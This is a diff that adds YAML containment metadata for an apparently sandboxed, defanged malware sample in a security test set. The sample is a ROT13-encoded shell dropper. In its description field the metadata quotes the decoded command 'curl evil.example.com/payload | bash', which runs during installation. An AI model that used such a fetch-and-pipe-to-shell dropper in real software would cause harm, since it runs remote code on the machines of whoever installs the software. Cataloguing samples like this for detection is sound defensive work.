@@ -1,0 +1,8 @@
+containment:
+  sandboxed: true
+  defanged_urls: true
+  defanged_payloads: true
+  original_threat: "ROT13-encoded shell dropper — decodes 'curl evil.example.com/payload | bash' using tr and pipes to sh during installation"
+  containment_notes: "All URLs point to evil.example.com. No real credentials. ROT13 payload decodes to defanged URL only."
+category: encoding-obfuscation
+technique: rot13-encoded-shell-pipeline
